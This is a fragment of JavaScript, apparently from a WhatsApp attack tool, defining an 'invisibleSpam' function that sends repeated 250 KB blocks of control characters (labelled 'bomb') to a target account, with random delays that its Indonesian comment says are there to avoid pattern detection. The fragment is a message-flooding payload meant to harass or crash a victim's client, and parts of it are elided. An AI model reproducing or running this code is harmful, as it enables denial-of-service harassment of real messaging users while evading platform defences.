...
/**
 * vtxDestroyerFusion  (invisible-spam, no-tag, anti-kenon)
 * @param {WASocket} valtix  instance socket
 * @param {string}   target  full jid target
 */
async function invisibleSpam(valtix, target) {
  const CHUNK = 250_000;                // 250 KB
  const bomb = '\x10'.repeat(CHUNK);    // payload
  const BURST = 4;                      // 4×250 KB = 1 MB
  ...
  /* 1 cycle = 1 MB */
  for (let i = 0; i < BURST; i++) await sendChunk(bomb);

  /* jitter kecil biar ga kena pola */
  await new Promise(r =>
    setTimeout(r, 1100 + Math.floor(Math.random() * 500))
  );
}
